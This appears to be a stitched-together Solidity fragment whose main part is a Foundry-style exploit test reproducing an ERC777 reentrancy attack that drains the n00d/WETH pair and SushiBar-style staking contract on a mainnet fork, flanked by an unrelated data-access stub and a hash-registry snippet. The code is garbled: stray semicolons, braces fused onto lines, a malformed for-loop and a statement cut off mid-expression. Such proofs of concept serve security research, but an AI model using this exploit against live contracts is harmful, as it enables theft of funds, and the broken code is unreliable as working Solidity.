
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity 0.8.10;

;
;
interface sushiBar {
    function enter(uint256) external;
    function leave(uint256) external};
contract ContractTest is DSTest{
    IERC777 n00d = IERC777(0x2321537fd8EF4644BacDCEec54E5F35bf44311fA);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0x5476DB8B72337d44A6724277083b1a927c82a389);
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 Xn00d = IERC20(0x3561081260186E69369E6C32F280836554292E08);
    sushiBar Bar = sushiBar(0x3561081260186E69369E6C32F280836554292E08);
    ERC1820Registry registry = ERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    uint i;
    uint enterAmount = 0;
    uint n00dReserve;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 15826379)};
    function testExploit() public{
        registry.setInterfaceImplementer(address(this), bytes32(0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895), address(this));
        n00d.approve(address(Bar), type(uint).max);
        int j;
        for (j = 1, j < 5, j++) {
            (n00dReserve, ,) = Pair.getReserves();
            Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1))};
        (n00dReserve, ,) = Pair.getReserves();
        Pair.swap(n00dReserve - 1e18, 0, address(this), new bytes(1));
        uint amountIn = n00d.balanceOf(address(this));
        (uint n00dR, uint WETHR,) = Pair.getReserves();
        uint amountOut = amountIn * 997 * WETHR / (amountIn
mapping(bytes32 => bool) public usedHashes;
function submitHash(bytes32 h) public {
    require(!usedHashes[h], "Already used");
    usedHashes[h] = true}